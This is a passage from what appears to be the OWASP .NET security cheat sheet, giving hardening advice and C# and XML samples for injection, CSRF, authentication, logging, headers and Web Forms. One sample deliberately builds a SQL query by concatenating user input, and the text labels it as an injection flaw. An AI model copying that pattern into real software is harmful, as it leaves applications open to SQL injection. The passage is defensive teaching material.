effective way of countering the SQL Injection vulnerability.\r\n\r\nDO: Use parameterized queries where a direct SQL query must be used. More Information can be found in the\r\n[Query Parameterization Cheat Sheet](Query_Parameterization_Cheat_Sheet.md).\r\n\r\nE.g., using Entity Framework:\r\n\r\n```csharp\r\nvar sql = @\"Update [User] SET FirstName = @FirstName WHERE Id = @Id\";\r\ncontext.Database.ExecuteSqlCommand(\r\n    sql,\r\n    new SqlParameter(\"@FirstName\", firstname),\r\n    new SqlParameter(\"@Id\", id));\r\n```\r\n\r\nDO NOT: Concatenate strings anywhere in your code and execute them against your database (Known as *dynamic SQL*).\r\n\r\nNote: You can still accidentally do this with ORMs or Stored procedures so check everywhere. For example:\r\n\r\n```csharp\r\nstring sql = \"SELECT * FROM Users WHERE UserName='\" + txtUser.Text + \"' AND Password='\"\r\n                + txtPassword.Text + \"'\";\r\ncontext.Database.ExecuteSqlCommand(sql); // SQL Injection vulnerability!\r\n```\r\n\r\nDO: Practice Least Privilege - connect to the database using an account with a minimum set of permissions required\r\nto do its job, not the database administrator account.\r\n\r\n#### OS Injection\r\n\r\nGeneral guidance about OS Injection can be found in the [OS Command Injection Defense Cheat Sheet](OS_Command_Injection_Defense_Cheat_Sheet.md).\r\n\r\nDO: Use [System.Diagnostics.Process.Start](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=netframework-4.7.2) to call underlying OS functions.\r\n\r\ne.g\r\n\r\n``` csharp\r\nvar process = new System.Diagnostics.Process();\r\nvar startInfo = new System.Diagnostics.ProcessStartInfo();\r\nstartInfo.FileName = \"validatedCommand\";\r\nstartInfo.Arguments = \"validatedArg1 validatedArg2 validatedArg3\";\r\nprocess.StartInfo = startInfo;\r\nprocess.Start();\r\n```\r\n\r\nDO NOT: Assume that this mechanism will protect against malicious input designed to break out of one argument and then tamper with another argument to the process. This will still be possible.\r\n\r\nDO: Use allow list validation on all user supplied input wherever possible. Input validation prevents improperly formed data from entering an information system. For more information please see the [Input Validation Cheat Sheet](Input_Validation_Cheat_Sheet.md).\r\n\r\ne.g Validating user input using [IPAddress.TryParse Method](https://docs.microsoft.com/en-us/dotnet/api/system.net.ipaddress.tryparse?view=netframework-4.8)\r\n\r\n``` csharp\r\n//User input\r\nstring ipAddress = \"127.0.0.1\";\r\n\r\n//check to make sure an ip address was provided\r\nif (!string.IsNullOrEmpty(ipAddress))\r\n{\r\n // Create an instance of IPAddress for the specified address string (in\r\n // dotted-quad, or colon-hexadecimal notation).\r\n if (IPAddress.TryParse(ipAddress, out var address))\r\n {\r\n  // Display the address in standard notation.\r\n  return address.ToString();\r\n }\r\n else\r\n {\r\n  //ipAddress is not of type IPAddress\r\n  ...\r\n }\r\n    ...\r\n}\r\n```\r\n\r\nDO: Try to only accept characters which are simple alphanumeric.\r\n\r\nDO NOT: Assume you can sanitize special characters without actually removing them. Various combinations of ```\\```, ```'``` and ```@``` may have an unexpected impact on sanitization attempts.\r\n\r\nDO NOT: Rely on methods without a security guarantee.\r\n\r\ne.g. .NET Core 2.2 and greater and .NET 5 and greater support [ProcessStartInfo.ArgumentList](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist) which performs some character escaping but the object includes [a disclaimer that it is not safe with untrusted input](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist#remarks).\r\n\r\nDO: Look at alternatives to passing raw untrusted arguments via command-line parameters such as encoding using Base64 (which would safely encode any special characters as well) and then decode the parameters in the receiving application.\r\n\r\n#### LDAP injection\r\n\r\nAlmost any characters can be used in Distinguished Names. However, some must be escaped with the backslash `\\` escape character.\r\nA table showing which characters that should be escaped for Active Directory can be found at the in the\r\n[LDAP Injection Prevention Cheat Sheet](LDAP_Injection_Prevention_Cheat_Sheet.md).\r\n\r\nNote: The space character must be escaped only if it is the leading or trailing character in a component name, such as a Common Name.\r\nEmbedded spaces should not be escaped.\r\n\r\nMore information can be found in the [LDAP Injection Prevention Cheat Sheet](LDAP_Injection_Prevention_Cheat_Sheet.md).\r\n\r\n### A04 Insecure Design\r\n\r\nInsecure design refers to security failures in the design of the application or system. This is different than the other items\r\nin the OWASP Top 10 list which refer to implementation failures. The topic of secure design is therefore not related to a specific\r\ntechnology or language and is therefore out of scope for this cheat sheet. See the [Secure Product Design Cheat Sheet](Secure_Product_Design_Cheat_Sheet.md) for more information.\r\n\r\n### A05 Security Misconfiguration\r\n\r\n#### Debug and Stack Trace\r\n\r\nEnsure debug and trace are off in production. This can be enforced using web.config transforms:\r\n\r\n```xml\r\n<compilation xdt:Transform=\"RemoveAttributes(debug)\" />\r\n<trace enabled=\"false\" xdt:Transform=\"Replace\"/>\r\n```\r\n\r\nDO NOT: Use default passwords\r\n\r\nDO: Redirect a request made over HTTP to HTTPS:\r\n\r\nE.g, Global.asax.cs:\r\n\r\n```csharp\r\nprotected void Application_BeginRequest()\r\n{\r\n    #if !DEBUG\r\n    // SECURE: Ensure any request is returned over SSL/TLS in production\r\n    if (!Request.IsLocal && !Context.Request.IsSecureConnection) {\r\n        var redirect = Context.Request.Url.ToString()\r\n                        .ToLower(CultureInfo.CurrentCulture)\r\n                        .Replace(\"http:\", \"https:\");\r\n        Response.Redirect(redirect);\r\n    }\r\n    #endif\r\n}\r\n```\r\n\r\nE.g., Startup.cs in `Configure()`:\r\n\r\n``` csharp\r\n  app.UseHttpsRedirection();\r\n```\r\n\r\n#### Cross-site request forgery\r\n\r\nDO NOT: Send sensitive data without validating Anti-Forgery-Tokens ([.NET](https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks) / [.NET Core](https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-7.0#aspnet-core-antiforgery-configuration)).\r\n\r\nDO: Send the anti-forgery token with every POST/PUT request:\r\n\r\n##### Using .NET Framework\r\n\r\n```csharp\r\nusing (Html.BeginForm(\"LogOff\", \"Account\", FormMethod.Post, new { id = \"logoutForm\",\r\n                        @class = \"pull-right\" }))\r\n{\r\n    @Html.AntiForgeryToken()\r\n    <ul class=\"nav nav-pills\">\r\n        <li role=\"presentation\">\r\n        Logged on as @User.Identity.Name\r\n        </li>\r\n        <li role=\"presentation\">\r\n        <a href=\"javascript:document.getElementById('logoutForm').submit()\">Log off</a>\r\n        </li>\r\n    </ul>\r\n}\r\n```\r\n\r\nThen validate it at the method or preferably the controller level:\r\n\r\n```csharp\r\n[HttpPost]\r\n[ValidateAntiForgeryToken]\r\npublic ActionResult LogOff()\r\n```\r\n\r\nMake sure the tokens are removed completely for invalidation on logout.\r\n\r\n```csharp\r\n/// <summary>\r\n/// SECURE: Remove any remaining cookies including Anti-CSRF cookie\r\n/// </summary>\r\npublic void RemoveAntiForgeryCookie(Controller controller)\r\n{\r\n    string[] allCookies = controller.Request.Cookies.AllKeys;\r\n    foreach (string cookie in allCookies)\r\n    {\r\n        if (controller.Response.Cookies[cookie] != null &&\r\n            cookie == \"__RequestVerificationToken\")\r\n        {\r\n            controller.Response.Cookies[cookie].Expires = DateTime.Now.AddDays(-1);\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n##### Using .NET Core 2.0 or later\r\n\r\nStarting with .NET Core 2.0 it is possible to [automatically generate and verify the antiforgery token](https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-7.0#aspnet-core-antiforgery-configuration).\r\n\r\nIf you are using [tag-helpers](https://docs.microsoft.com/en-us/aspnet/core/mvc/views/tag-helpers/intro), which is the default for most web project templates, then all forms will automatically send the anti-forgery token. You can check if tag-helpers are enabled by checking if your main `_ViewImports.cshtml` file contains:\r\n\r\n```csharp\r\n@addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers\r\n```\r\n\r\n`IHtmlHelper.BeginForm` also sends anti-forgery-tokens automatically.\r\n\r\nIf you are not using tag-helpers or `IHtmlHelper.BeginForm`, you must use the requisite helper on forms as seen here:\r\n\r\n```html\r\n<form action=\"RelevantAction\" >\r\n@Html.AntiForgeryToken()\r\n</form>\r\n```\r\n\r\nTo automatically validate all requests other than GET, HEAD, OPTIONS and TRACE you need to add a global action filter with the [AutoValidateAntiforgeryToken](https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.mvc.autovalidateantiforgerytokenattribute?view=aspnetcore-7.0) attribute inside your `Startup.cs` as mentioned in the following [article](https://andrewlock.net/automatically-validating-anti-forgery-tokens-in-asp-net-core-with-the-autovalidateantiforgerytokenattribute/):\r\n\r\n```csharp\r\nservices.AddMvc(options =>\r\n{\r\n    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());\r\n});\r\n```\r\n\r\nIf you need to disable the attribute validation for a specific method on a controller you can add the [IgnoreAntiforgeryToken](https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.mvc.ignoreantiforgerytokenattribute?view=aspnetcore-7.0) attribute to the controller method (for MVC controllers) or parent class (for Razor pages):\r\n\r\n```csharp\r\n[IgnoreAntiforgeryToken]\r\n[HttpDelete]\r\npublic IActionResult Delete()\r\n```\r\n\r\n```csharp\r\n[IgnoreAntiforgeryToken]\r\npublic class UnsafeModel : PageModel\r\n```\r\n\r\nIf you need to also validate the token on GET, HEAD, OPTIONS and TRACE requests you can add the [ValidateAntiforgeryToken](https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.mvc.validateantiforgerytokenattribute?view=aspnetcore-7.0) attribute to the controller method (for MVC controllers) or parent class (for Razor pages):\r\n\r\n```csharp\r\n[HttpGet]\r\n[ValidateAntiforgeryToken]\r\npublic IActionResult DoSomethingDangerous()\r\n```\r\n\r\n```csharp\r\n[HttpGet]\r\n[ValidateAntiforgeryToken]\r\npublic class SafeModel : PageModel\r\n```\r\n\r\nIn case you can't use a global action filter, add the [AutoValidateAntiforgeryToken](https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.mvc.autovalidateantiforgerytokenattribute?view=aspnetcore-7.0) attribute to your controller classes or razor page models:\r\n\r\n```csharp\r\n[AutoValidateAntiforgeryToken]\r\npublic class UserController\r\n```\r\n\r\n```csharp\r\n[AutoValidateAntiforgeryToken]\r\npublic class SafeModel : PageModel\r\n```\r\n\r\n##### Using .Net Core or .NET Framework with AJAX\r\n\r\nYou will need to attach the anti-forgery token to AJAX requests.\r\n\r\nIf you are using jQuery in an ASP.NET Core MVC view this can be achieved using this snippet:\r\n\r\n```javascript\r\n@inject  Microsoft.AspNetCore.Antiforgery.IAntiforgery antiforgeryProvider\r\n$.ajax(\r\n{\r\n    type: \"POST\",\r\n    url: '@Url.Action(\"Action\", \"Controller\")',\r\n    contentType: \"application/x-www-form-urlencoded; charset=utf-8\",\r\n    data: {\r\n        id: id,\r\n        '__RequestVerificationToken': '@antiforgeryProvider.GetAndStoreTokens(this.Context).RequestToken'\r\n    }\r\n})\r\n```\r\n\r\nIf you are using the .NET Framework, you can find some code snippets [here](https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks#anti-csrf-and-ajax).\r\n\r\nMore information can be found in the [Cross-Site Request Forgery Prevention Cheat Sheet](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md).\r\n\r\n### A06 Vulnerable and Outdated Components\r\n\r\nDO: Keep the .NET framework updated with the latest patches\r\n\r\nDO: Keep your [NuGet](https://docs.microsoft.com/en-us/nuget/) packages up to date\r\n\r\nDO: Run the [OWASP Dependency Checker](Vulnerable_Dependency_Management_Cheat_Sheet.md#tools) against your application as part of your build process and act on any high or critical level vulnerabilities.\r\n\r\nDO: Include SCA (software composition analysis) tools in your CI/CD pipeline to ensure that any new vulnerabilities\r\nin your dependencies are detected and acted upon.\r\n\r\n### A07 Identification and Authentication Failures\r\n\r\nDO: Use [ASP.NET Core Identity](https://docs.microsoft.com/en-us/aspnet/core/security/authentication/identity?view=aspnetcore-2.2&).\r\nASP.NET Core Identity framework is well configured by default, where it uses secure password hashes and an individual salt. Identity uses the PBKDF2 hashing function for passwords, and generates a random salt per user.\r\n\r\nDO: Set secure password policy\r\n\r\ne.g ASP.NET Core Identity\r\n\r\n``` csharp\r\n//Startup.cs\r\nservices.Configure<IdentityOptions>(options =>\r\n{\r\n // Password settings\r\n options.Password.RequireDigit = true;\r\n options.Password.RequiredLength = 8;\r\n options.Password.RequireNonAlphanumeric = true;\r\n options.Password.RequireUppercase = true;\r\n options.Password.RequireLowercase = true;\r\n options.Password.RequiredUniqueChars = 6;\r\n\r\n options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(30);\r\n options.Lockout.MaxFailedAccessAttempts = 3;\r\n\r\n options.SignIn.RequireConfirmedEmail = true;\r\n\r\n options.User.RequireUniqueEmail = true;\r\n});\r\n```\r\n\r\nDO: Set a cookie policy\r\n\r\ne.g\r\n\r\n``` csharp\r\n//Startup.cs\r\nservices.ConfigureApplicationCookie(options =>\r\n{\r\n options.Cookie.HttpOnly = true;\r\n options.Cookie.Expiration = TimeSpan.FromHours(1)\r\n options.SlidingExpiration = true;\r\n});\r\n```\r\n\r\n### A08 Software and Data Integrity Failures\r\n\r\nDO: Digitally sign assemblies and executable files\r\n\r\nDO: Use Nuget package signing\r\n\r\nDO: Review code and configuration changes to avoid malicious code\r\nor dependencies being introduced\r\n\r\nDO NOT: Send unsigned or unencrypted serialized objects over the network\r\n\r\nDO: Perform integrity checks or validate digital signatures on serialized\r\nobjects received from the network\r\n\r\n### A09 Security Logging and Monitoring Failures\r\n\r\nDO: Ensure all login, access control, and server-side input validation failures are logged with sufficient user context to identify suspicious or malicious accounts.\r\n\r\nDO: Establish effective monitoring and alerting so suspicious activities are detected and responded to in a timely fashion.\r\n\r\nDO NOT: Log generic error messages such as: ```csharp Log.Error(\"Error was thrown\");```. Instead, log the stack trace, error message and user ID who caused the error.\r\n\r\nDO NOT: Log sensitive data such as user's passwords.\r\n\r\n#### Logging\r\n\r\nWhat logs to collect and more information about logging can be found in the [Logging Cheat Sheet](Logging_Cheat_Sheet.md).\r\n\r\n.NET Core comes with a LoggerFactory, which is in Microsoft.Extensions.Logging. More information about ILogger can be found [here](https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.logging.ilogger).\r\n\r\nHow to log all errors from the `Startup.cs`, so that anytime an error is thrown it will be logged:\r\n\r\n``` csharp\r\npublic void Configure(IApplicationBuilder app, IHostingEnvironment env)\r\n{\r\n    if (env.IsDevelopment())\r\n    {\r\n        _isDevelopment = true;\r\n        app.UseDeveloperExceptionPage();\r\n    }\r\n\r\n    //Log all errors in the application\r\n    app.UseExceptionHandler(errorApp =>\r\n    {\r\n        errorApp.Run(async context =>\r\n        {\r\n            var errorFeature = context.Features.Get<IExceptionHandlerFeature>();\r\n            var exception = errorFeature.Error;\r\n\r\n            Log.Error(String.Format(\"Stacktrace of error: {0}\",exception.StackTrace.ToString()));\r\n        });\r\n    });\r\n\r\n    app.UseAuthentication();\r\n    app.UseMvc();\r\n }\r\n}\r\n```\r\n\r\nE.g. injecting into the class constructor, which makes writing unit test simpler. This is recommended if instances of the class will be created using dependency injection (e.g. MVC controllers). The below example shows logging of all unsuccessful login attempts.\r\n\r\n``` csharp\r\npublic class AccountsController : Controller\r\n{\r\n        private ILogger _Logger;\r\n\r\n        public AccountsController(ILogger logger)\r\n        {\r\n            _Logger = logger;\r\n        }\r\n\r\n        [HttpPost]\r\n        [AllowAnonymous]\r\n        [ValidateAntiForgeryToken]\r\n        public async Task<IActionResult> Login(LoginViewModel model)\r\n        {\r\n            if (ModelState.IsValid)\r\n            {\r\n                var result = await _signInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, lockoutOnFailure: false);\r\n                if (result.Succeeded)\r\n                {\r\n                    //Log all successful log in attempts\r\n                    Log.Information(String.Format(\"User: {0}, Successfully Logged in\", model.Email));\r\n                    //Code for successful login\r\n                    //...\r\n                }\r\n                else\r\n                {\r\n                    //Log all incorrect log in attempts\r\n                    Log.Information(String.Format(\"User: {0}, Incorrect Password\", model.Email));\r\n                }\r\n             }\r\n            ...\r\n        }\r\n```\r\n\r\n#### Monitoring\r\n\r\nMonitoring allow us to validate the performance and health of a running system through key performance indicators.\r\n\r\nIn .NET a great option to add monitoring capabilities is [Application Insights](https://docs.microsoft.com/en-us/azure/azure-monitor/app/asp-net-core).\r\n\r\nMore information about Logging and Monitoring can be found [here](https://github.com/microsoft/code-with-engineering-playbook/blob/main/docs/observability/README.md).\r\n\r\n### A10 Server-Side Request Forgery (SSRF)\r\n\r\nDO: Validate and sanitize all user input before using it to make a request\r\n\r\nDO: Use an allow list of allowed protocols and domains\r\n\r\nDO: Use `IPAddress.TryParse()` and `Uri.CheckHostName()` to ensure that IP addresses and domain names are valid\r\n\r\nDO NOT: Follow HTTP redirects\r\n\r\nDO NOT: Forward raw HTTP responses to the user\r\n\r\nFor more information please see the [Server-Side Request Forgery Prevention Cheat Sheet](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md).\r\n\r\n### OWASP 2013 & 2017\r\n\r\nBelow are vulnerabilities that were included in the 2013 or 2017 OWASP Top 10 list\r\nthat were not included in the 2021 list. These vulnerabilities are still relevant\r\nbut were not included in the 2021 list because they have become less prevalent.\r\n\r\n#### A04:2017 XML External Entities (XXE)\r\n\r\nXXE attacks occur when an XML parse does not properly process user input that contains external entity declarations in the doctype of an XML payload.\r\n\r\n[This article](https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xml-processing-options) discusses the most common XML Processing Options for .NET.\r\n\r\nPlease refer to the [XXE cheat sheet](XML_External_Entity_Prevention_Cheat_Sheet.md#net) for more detailed information on preventing XXE and other XML Denial of Service attacks.\r\n\r\n#### A07:2017 Cross-Site Scripting (XSS)\r\n\r\nDO NOT: Trust any data the user sends you. Prefer allow lists (always safe) over block lists.\r\n\r\nYou get encoding of all HTML content with MVC3. To properly encode all content whether HTML,\r\nJavaScript, CSS, LDAP, etc., use the Microsoft AntiXSS library:\r\n\r\n`Install-Package AntiXSS`\r\n\r\nThen set in config:\r\n\r\n```xml\r\n<system.web>\r\n<httpRuntime targetFramework=\"4.5\"\r\nenableVersionHeader=\"false\"\r\nencoderType=\"Microsoft.Security.Application.AntiXssEncoder, AntiXssLibrary\"\r\nmaxRequestLength=\"4096\" />\r\n```\r\n\r\nDO NOT: Use the `[AllowHTML]` attribute or helper class `@Html.Raw` unless you are absolutely\r\nsure that the content you are writing to the browser is safe and has been escaped properly.\r\n\r\nDO: Enable a [Content Security Policy](Content_Security_Policy_Cheat_Sheet.md#context). This will prevent your pages from accessing assets they should not be able to access (e.g. malicious scripts):\r\n\r\n```xml\r\n<system.webServer>\r\n    <httpProtocol>\r\n        <customHeaders>\r\n            <add name=\"Content-Security-Policy\"\r\n                value=\"default-src 'none'; style-src 'self'; img-src 'self';\r\n                font-src 'self'; script-src 'self'\" />\r\n```\r\n\r\nMore information can be found in the [Cross Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\n#### A08:2017 Insecure Deserialization\r\n\r\nDO NOT: Accept Serialized Objects from Untrusted Sources\r\n\r\nDO: Validate User Input\r\n\r\nMalicious users are able to use objects like cookies to insert malicious information to change user roles. In some cases, hackers are able to elevate their privileges to administrator rights by using a pre-existing or cached password hash from a previous session.\r\n\r\nDO: Prevent Deserialization of Domain Objects\r\n\r\nDO: Run the Deserialization Code with Limited Access Permissions\r\nIf a deserialized hostile object tries to initiate a system processes or access a resource within the server or the host's OS, it will be denied access and a permission flag will be raised so that a system administrator is made aware of any anomalous activity on the server.\r\n\r\nMore information about Insecure Deserialization can be found in the [Deserialization Cheat Sheet](Deserialization_Cheat_Sheet.md#net-csharp).\r\n\r\n#### A10:2013 Unvalidated redirects and forwards\r\n\r\nA protection against this was introduced in MVC 3 template. Here is the code:\r\n\r\n```csharp\r\npublic async Task<ActionResult> LogOn(LogOnViewModel model, string returnUrl)\r\n{\r\n    if (ModelState.IsValid)\r\n    {\r\n        var logonResult = await _userManager.TryLogOnAsync(model.UserName, model.Password);\r\n        if (logonResult.Success)\r\n        {\r\n            await _userManager.LogOnAsync(logonResult.UserName, model.RememberMe);  \r\n            return RedirectToLocal(returnUrl);\r\n...\r\n```\r\n\r\n```csharp\r\nprivate ActionResult RedirectToLocal(string returnUrl)\r\n{\r\n    if (Url.IsLocalUrl(returnUrl))\r\n    {\r\n        return Redirect(returnUrl);\r\n    }\r\n    else\r\n    {\r\n        return RedirectToAction(\"Landing\", \"Account\");\r\n    }\r\n}\r\n```\r\n\r\n### Other advice\r\n\r\n- Protect against Clickjacking and Man-in-the-Middle attack from capturing an initial Non-TLS request: Set the `X-Frame-Options` and `Strict-Transport-Security` (HSTS) headers. Full details [here](https://github.com/johnstaveley/SecurityEssentials/blob/master/SecurityEssentials/Core/HttpHeaders.cs)\r\n- Protect against a man-in-the-middle attack for a user who has never been to your site before. Register for [HSTS preload](https://hstspreload.org/)\r\n- Maintain security testing and analysis on Web API services. They are hidden inside MVC sites, and are public parts of a site that\r\nwill be found by an attacker. All of the MVC guidance and much of the WCF guidance applies to Web API as well.\r\n- Also see the [Unvalidated Redirects and Forwards Cheat Sheet](Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md).\r\n\r\n#### Sample project\r\n\r\nFor more information on all of the above and code samples incorporated into a sample MVC5 application with an enhanced security baseline\r\ngo to [Security Essentials Baseline project](http://github.com/johnstaveley/SecurityEssentials/).\r\n\r\n## Guidance for specific topics\r\n\r\nThis section contains guidance for specific topics in .NET.\r\n\r\n### Configuration and Deployment\r\n\r\n- Lock down config files.\r\n    - Remove all aspects of configuration that are not in use.\r\n    - Encrypt sensitive parts of the `web.config` using `aspnet_regiis -pe` ([command line help](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-2.0/k6h9cz8h(v=vs.80))).\r\n- For ClickOnce applications, the .NET Framework should be upgraded to use the latest version to ensure support of TLS 1.2 or later.\r\n\r\n### Data Access\r\n\r\n- Use [Parameterized SQL](https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand.prepare?view=netframework-4.7.2) commands for all data access, without exception.\r\n- Do not use [SqlCommand](https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand) with a string parameter made up of a [concatenated SQL String](https://docs.microsoft.com/en-gb/visualstudio/code-quality/ca2100-review-sql-queries-for-security-vulnerabilities?view=vs-2017).\r\n- List allowable values coming from the user. Use enums, [TryParse](https://docs.microsoft.com/en-us/dotnet/api/system.int32.tryparse#System_Int32_TryParse_System_String_System_Int32__) or lookup values to assure that the data coming from the user is as expected.\r\n    - Enums are still vulnerable to unexpected values because .NET only validates a successful cast to the underlying data type, integer by default. [Enum.IsDefined](https://docs.microsoft.com/en-us/dotnet/api/system.enum.isdefined) can validate whether the input value is valid within the list of defined constants.\r\n- Apply the principle of least privilege when setting up the Database User in your database of choice. The database user should only be able to access items that make sense for the use case.\r\n- Use of [Entity Framework](https://docs.microsoft.com/en-us/ef/) is a very effective [SQL injection](SQL_Injection_Prevention_Cheat_Sheet.md) prevention mechanism. **Remember that building your own ad hoc queries in Entity Framework is just as susceptible to SQLi as a plain SQL query**.\r\n- When using SQL Server, prefer [integrated authentication](https://learn.microsoft.com/en-us/sql/connect/odbc/linux-mac/using-integrated-authentication?view=sql-server-ver16) over [SQL authentication](https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver16#connecting-through-sql-server-authentication).\r\n- Use [Always Encrypted](https://docs.microsoft.com/en-us/sql/relational-databases/security/encryption/always-encrypted-database-engine) where possible for sensitive data (SQL Server 2016+ and Azure SQL)\r\n\r\n## ASP NET Web Forms Guidance\r\n\r\nASP.NET Web Forms is the original browser-based application development API for the .NET Framework, and is still the most common enterprise platform for web application development.\r\n\r\n- Always use [HTTPS](http://support.microsoft.com/kb/324069).\r\n- Enable [requireSSL](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpcookiessection.requiressl) on cookies and form elements and [HttpOnly](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpcookiessection.httponlycookies) on cookies in the web.config.\r\n- Implement [customErrors](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.customerror).\r\n- Make sure [tracing](http://www.iis.net/configreference/system.webserver/tracing) is turned off.\r\n- While ViewState isn't always appropriate for web development, using it can provide CSRF mitigation. To make the ViewState protect against CSRF attacks you need to set the [ViewStateUserKey](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.page.viewstateuserkey):\r\n\r\n```csharp\r\nprotected override OnInit(EventArgs e) {\r\n    base.OnInit(e);\r\n    ViewStateUserKey = Session.SessionID;\r\n}\r\n```\r\n\r\nIf you don't use Viewstate, then look to the default master page of the ASP.NET Web Forms default template for a manual anti-CSRF token using a double-submit cookie.\r\n\r\n```csharp\r\nprivate const string AntiXsrfTokenKey = \"__AntiXsrfToken\";\r\nprivate const string AntiXsrfUserNameKey = \"__AntiXsrfUserName\";\r\nprivate string _antiXsrfTokenValue;\r\nprotected void Page_Init(object sender, EventArgs e)\r\n{\r\n    // The code below helps to protect against XSRF attacks\r\n    var requestCookie = Request.Cookies[AntiXsrfTokenKey];\r\n    Guid requestCookieGuidValue;\r\n    if (requestCookie != null && Guid.TryParse(requestCookie.Value, out requestCookieGuidValue))\r\n    {\r\n       // Use the Anti-XSRF token from the cookie\r\n       _antiXsrfTokenValue = requestCookie.Value;\r\n       Page.ViewStateUserKey = _antiXsrfTokenValue;\r\n    }\r\n    else\r\n    {\r\n       // Generate a new Anti-XSRF token and save to the cookie\r\n       _antiXsrfTokenValue = Guid.NewGuid().ToString(\"N\");\r\n       Page.ViewStateUserKey = _antiXsrfTokenValue;\r\n       var responseCookie = new HttpCookie(AntiXsrfTokenKey)\r\n       {\r\n          HttpOnly = true,\r\n          Value = _antiXsrfTokenValue\r\n       };\r\n       if (FormsAuthentication.RequireSSL && Request.IsSecureConnection)\r\n       {\r\n          responseCookie.Secure = true;\r\n       }\r\n       Response.Cookies.Set(responseCookie);\r\n    }\r\n    Page.PreLoad += master_Page_PreLoad;\r\n}\r\nprotected void master_Page_PreLoad(object sender, EventArgs e)\r\n{\r\n    if (!IsPostBack)\r\n    {\r\n       // Set Anti-XSRF token\r\n       ViewState[AntiXsrfTokenKey] = Page.ViewStateUserKey;\r\n       ViewState[AntiXsrfUserNameKey] = Context.User.Identity.Name ?? String.Empty;\r\n    }\r\n    else\r\n    {\r\n       // Validate the Anti-XSRF token\r\n       if ((string)ViewState[AntiXsrfTokenKey] != _antiXsrfTokenValue ||\r\n          (string)ViewState[AntiXsrfUserNameKey] != (Context.User.Identity.Name ?? String.Empty))\r\n       {\r\n          throw new InvalidOperationException(\"Validation of Anti-XSRF token failed.\");\r\n       }\r\n    }\r\n}\r\n```\r\n\r\n- Consider [HSTS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) in IIS. See [here](https://support.microsoft.com/en-us/help/954002/how-to-add-a-custom-http-response-header-to-a-web-site-that-is-hosted) for the procedure.\r\n- This is a recommended `web.config` setup that handles HSTS among other things.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n <configuration>\r\n   <system.web>\r\n     <httpRuntime enableVersionHeader=\"false\"/>\r\n   </system.web>\r\n   <system.webServer>\r\n     <security>\r\n       <requestFiltering removeServerHeader=\"true\" />\r\n     </security>\r\n     <staticContent>\r\n       <clientCache cacheControlCustom=\"public\"\r\n            cacheControlMode=\"UseMaxAge\"\r\n            cacheControlMaxAge=\"1.00:00:00\"\r\n            setEtag=\"true\" />\r\n     </staticContent>\r\n     <httpProtocol>\r\n       <customHeaders>\r\n         <add name=\"Content-Security-Policy\"\r\n            value=\"default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'\" />\r\n         <add name=\"X-Content-Type-Options\" value=\"NOSNIFF\" />\r\n         <add name=\"X-Frame-Options\" value=\"DENY\" />\r\n         <add name=\"X-Permitted-Cross-Domain-Policies\" value=\"master-only\"/>\r\n         <add name=\"X-XSS-Protection\" value=\"0\"/>\r\n         <remove name=\"X-Powered-By\"/>\r\n       </customHeaders>\r\n     </httpProtocol>\r\n     <rewrite>\r\n       <rules>\r\n         <rule name=\"Redirect to https\">\r\n           <match url=\"(.*)\"/>\r\n           <conditions>\r\n             <add input=\"{HTTPS}\" pattern=\"Off\"/>\r\n             <add input=\"{REQUEST_METHOD}\" pattern=\"^get$|^head$\" />\r\n           </conditions>\r\n           <action type=\"Redirect\" url=\"https://{HTTP_HOST}/{R:1}\" redirectType=\"Permanent\"/>\r\n         </rule>\r\n       </rules>\r\n       <outboundRules>\r\n         <rule name=\"Add HSTS Header\" enabled=\"true\">\r\n           <match serverVariable=\"RESPONSE_Strict_Transport_Security\" pattern=\".*\" />\r\n           <conditions>\r\n             <add input=\"{HTTPS}\" pattern=\"on\" ignoreCase=\"true\" />\r\n           </conditions>\r\n           <action type=\"Rewrite\" value=\"max-age=15768000\" />\r\n         </rule>\r\n       </outboundRules>\r\n     </rewrite>\r\n   </system.webServer>\r\n </configuration>\r\n```\r\n\r\n- Remove the version header by adding the following line in `Machine.config` file:\r\n\r\n```xml\r\n<httpRuntime enableVersionHeader=\"false\" />\r\n```\r\n\r\n- Also remove the Server header using the HttpContext Class in your code.\r\n\r\n```csharp\r\nHttpContext.Current.Response.Headers.Remove(\"Server\");\r\n```\r\n\r\n### HTTP validation and encoding\r\n\r\n- Do not disable [validateRequest](http://www.asp.net/whitepapers/request-validation) in the `web.config` or the page setup. This value enables limited XSS protection in ASP.NET and should be left intact as it provides partial prevention of Cross Site Scripting. Complete request validation is recommended in addition to the built-in protections.\r\n- The 4.5 version of the .NET 